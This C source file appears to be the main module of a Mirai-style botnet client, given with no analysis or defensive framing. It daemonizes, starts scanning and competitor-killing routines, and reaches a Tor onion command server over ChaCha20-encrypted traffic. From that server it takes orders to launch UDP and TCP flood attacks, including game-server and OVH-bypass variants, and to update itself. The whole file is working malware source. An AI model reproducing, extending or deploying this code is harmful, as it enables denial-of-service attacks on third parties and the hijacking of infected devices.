#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <sys/select.h>
#include <sys/time.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/wait.h>
#include <signal.h>

volatile int child_pid = 0;

void sig_handler(int signo) {
    if(signo == SIGUSR1 && child_pid > 0) {
        kill(child_pid, 9);
        exit(0);
    }
}

#include "headers/attacks.h"
#include "headers/utils.h"
#include "headers/chacha20.h"
#include "headers/cnc_protocol.h"
#include "headers/table.h"
#include "headers/rand.h"
#include "headers/scanner.h"

#include "headers/daemon.h"
#include "headers/locker.h"
#include "headers/update.h"
#include "headers/resolv.h"
#include "headers/config.h"
#include "headers/tor.h"

#include "headers/killer.h"
#include "headers/watchdog.h"

#ifndef ARCH
#define ARCH "unknown"
#endif

void process_binary_command(const uint8_t *data, size_t len) {
    if (len < 1) return;
    uint8_t msg_type = data[0];

    if (msg_type == MSG_TYPE_ATTACK) {
        uint8_t method; uint32_t ip; uint16_t port; uint32_t duration;
        struct attack_option *opts = NULL; uint8_t opts_len = 0;

        if (parse_attack(data, &method, &ip, &port, &duration, &opts, &opts_len) != 0) return;

        struct in_addr addr; addr.s_addr = ip;
        char *ip_str = inet_ntoa(addr);

        int pid1 = fork();
        if (pid1 == -1 || pid1 > 0) {
            if (opts != NULL) {
                for (int i = 0; i < opts_len; i++) free(opts[i].val);
                free(opts);
            }
            return;
        }

        signal(SIGUSR1, sig_handler);
        int pid2 = fork();
        if (pid2 == -1) exit(0);

        if (pid2 == 0) {
            signal(SIGUSR1, SIG_IGN);
            switch(method) {
                case ATTACK_UDP: attack_udp_generic(ip_str, port, duration, opts, opts_len); break;
                case ATTACK_HEX: attack_udp_hex(ip_str, port, duration, opts, opts_len); break;
                case ATTACK_UDPTHREADS: attack_udp_threads(ip_str, port, duration, opts, opts_len); break;
                case ATTACK_UDP_GAME: attack_udp_game(ip_str, port, duration, opts, opts_len); break;
                case ATTACK_TCP_BYPASS: attack_tcp_bypass(ip_str, port, duration, opts, opts_len); break;
                case ATTACK_UDPLEGIT: attack_udp_legit(ip_str, port, duration, opts, opts_len); break;
                case ATTACK_OVH: attack_udp_ovh(ip_str, port, duration, opts, opts_len); break;
                default: exit(0);
            }
            exit(0);
        } else {
            child_pid = pid2;
            sleep(duration);
            kill(pid2, 9);
            exit(0);
        }
    } else if (msg_type == MSG_TYPE_UPDATE) {
        handle_update(data + 1, len - 1);
    } else if (msg_type == MSG_TYPE_STOP) {
        kill(0, SIGUSR1);
    }
}

ipv4_t LOCAL_ADDR;
struct sockaddr_in srv_addr;
void (*resolve_func)(void) = NULL;
int global_sock = -1;
int fd_ctrl = -1;

void ensure_single_instance(void) {
    struct sockaddr_in addr;
    int opt = 1;
    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));
    addr.sin_family = AF_INET; addr.sin_addr.s_addr = INADDR_ANY; addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
        close(fd_ctrl);
        int kill_sock = socket(AF_INET, SOCK_STREAM, 0);
        if (kill_sock != -1) {
            connect(kill_sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
            close(kill_sock);
        }
        sleep(5);
        ensure_single_instance();
        return;
    }
    listen(fd_ctrl, 1);
}

int main(int argc, char *argv[]) {
    char infection_method[32];
    char orig_exec[256];
    util_zero(infection_method, 32); util_zero(orig_exec, 256);

    ssize_t len = readlink("/proc/self/exe", orig_exec, sizeof(orig_exec) - 1);
    if (len != -1) orig_exec[len] = '\0';
    else if (argc > 0) util_strncpy(orig_exec, argv[0], 255);

    if (argc > 1) {
        util_strncpy(infection_method, argv[1], 31);
        if (util_strcmp(argv[1], "update")) sleep(5);
    } else util_strcpy(infection_method, "unknown");

    static uint8_t global_key[CHACHA20_KEY_SIZE];
    util_zero(global_key, CHACHA20_KEY_SIZE);
    util_strncpy((char *)global_key, ENC_KEY, CHACHA20_KEY_SIZE);

#ifndef DEBUG
    daemonize(argc, argv, orig_exec);
#endif

    signal(SIGINT, SIG_IGN); signal(SIGUSR1, SIG_IGN);
    table_init(); scanner_init(); tor_init();
    killer_init(); watchdog_init(); watcher_init();
    sleep(2); ensure_single_instance();

    while(1){
        global_sock = socket(AF_INET, SOCK_STREAM, 0);
        if(global_sock < 0) { sleep(15); continue; }

        struct timeval timeout = {30, 0};
        setsockopt(global_sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
        setsockopt(global_sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));

        struct tor_proxy *proxy = tor_get_random();
        srv_addr.sin_family = AF_INET; srv_addr.sin_addr.s_addr = proxy->ip; srv_addr.sin_port = proxy->port;

        if(connect(global_sock, (struct sockaddr *)&srv_addr, sizeof(srv_addr)) < 0){
            tor_report_working(proxy, 0); close(global_sock); sleep(10); continue;
        }

        table_unlock_val(TABLE_CNC_ADDR);
        char *onion = table_retrieve_val(TABLE_CNC_ADDR, NULL);
        if (tor_socks5_handshake(global_sock, onion, FAKE_CNC_PORT) < 0) {
            tor_report_working(proxy, 0); table_lock_val(TABLE_CNC_ADDR); close(global_sock); sleep(10); continue;
        }
        table_lock_val(TABLE_CNC_ADDR);
        tor_report_working(proxy, 1);

        char bot_id[16]; get_bot_id(bot_id);
        uint8_t packet[256];
        uint8_t *nonce = packet;
        uint8_t *identity = packet + CHACHA20_NONCE_SIZE;
        for(int i = 0; i < CHACHA20_NONCE_SIZE; i++) nonce[i] = rand() % 256;
        serialize_identify(identity, bot_id, ARCH, infection_method);
        chacha20_encrypt(identity, sizeof(msg_identify_t), global_key, nonce);

        send(global_sock, packet, CHACHA20_NONCE_SIZE + sizeof(msg_identify_t), MSG_NOSIGNAL);

        while(1){
            fd_set readfds; FD_ZERO(&readfds);
            FD_SET(global_sock, &readfds);
            if (fd_ctrl != -1) FD_SET(fd_ctrl, &readfds);

            struct timeval tv = {50, 0};
            int max_fd = global_sock > fd_ctrl ? global_sock : fd_ctrl;
            int sr = select(max_fd + 1, &readfds, NULL, NULL, &tv);
            if (sr > 0 && FD_ISSET(global_sock, &readfds)) {
                uint8_t r_nonce[CHACHA20_NONCE_SIZE];
                if (recv(global_sock, r_nonce, CHACHA20_NONCE_SIZE, MSG_NOSIGNAL) != CHACHA20_NONCE_SIZE) break;

                char buffer[1024];
                int n = recv(global_sock, buffer, sizeof(buffer), 0);
                if (n <= 0) break;

                chacha20_encrypt((uint8_t *)buffer, n, global_key, r_nonce);
                process_binary_command((uint8_t *)buffer, n);
            } else if (sr > 0 && fd_ctrl != -1 && FD_ISSET(fd_ctrl, &readfds)) {
                kill(0, 9); exit(0);
            } else if (sr == 0) {
                uint8_t p_nonce[CHACHA20_NONCE_SIZE];
                for (int i = 0; i < CHACHA20_NONCE_SIZE; i++) p_nonce[i] = rand() % 256;
                uint8_t ping[1] = {MSG_TYPE_PING};
                chacha20_encrypt(ping, 1, global_key, p_nonce);
                if (send(global_sock, p_nonce, CHACHA20_NONCE_SIZE, MSG_NOSIGNAL) == -1) break;
                if (send(global_sock, ping, 1, MSG_NOSIGNAL) == -1) break;
            } else break;
        }
        close(global_sock); sleep(5);
    }
    return 0;
}
